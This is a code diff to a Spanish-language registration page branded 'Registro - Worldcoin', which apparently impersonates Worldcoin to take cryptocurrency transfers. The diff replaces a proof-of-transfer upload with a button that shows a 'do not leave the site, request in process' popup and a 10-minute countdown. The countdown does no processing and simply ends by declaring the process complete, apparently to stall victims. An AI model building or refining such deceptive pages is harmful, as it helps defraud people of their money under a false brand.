@@ -70,11 +70,33 @@
             text-align: center;
             margin-top: 20px;
         }
+         .input-group button.processing {
+        background-color: #3498db;
+    }
+
+    .countdown {
+        margin-top: 20px;
+        font-size: 18px;
+        color: #333;
+    }
+
+    .popup {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0px 0px 20px 0px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        display: none;
+    }
     </style>
 </head>
 
 <body>
-      <div class="container">
+     <div class="container">
         <h2>Registro - Worldcoin</h2>
 
         <div class="input-group">
@@ -98,14 +120,19 @@
         </div>
 
         <div class="input-group">
-            <label for="comprobante">Sube el comprobante del envío de Worldcoin:</label>
-            <input type="file" id="comprobante">
+            <button onclick="procesarSolicitud()">Cargar</button>
+        </div>
+
+        <div class="popup" id="popup">
+            No salga del sitio. La solicitud está en proceso.
+            <div class="countdown" id="countdown"></div>
         </div>
 
         <div class="support-text">
             <p>Soporte: <a href="mailto:WorldcoinAPP@Worldcoin.org">WorldcoinAPP@Worldcoin.org</a></p>
         </div>
     </div>
+
     <script>
         // Las funciones de JavaScript siguen igual
         function validarCorreo(correo) {
@@ -150,6 +177,25 @@
 
             // Puedes mostrar un mensaje de éxito
             alert('Dirección copiada: ' + direccion.innerText);
+        }
+          function procesarSolicitud() {
+            var popup = document.getElementById('popup');
+            popup.style.display = 'block';
+
+            // Comenzar cuenta regresiva de 10 minutos
+            var tiempoRestante = 600; // 10 minutos en segundos
+            var contador = setInterval(function () {
+                tiempoRestante--;
+                var countdown = document.getElementById('countdown');
+                countdown.innerHTML = 'Tiempo restante: ' + Math.floor(tiempoRestante / 60) + ' minutos ' +
+                    (tiempoRestante % 60) + ' segundos';
+
+                if (tiempoRestante <= 0) {
+                    clearInterval(contador);
+                    countdown.innerHTML = 'Proceso completo.';
+                    popup.style.display = 'none';
+                }
+            }, 1000);
         }
     </script>
 </body>
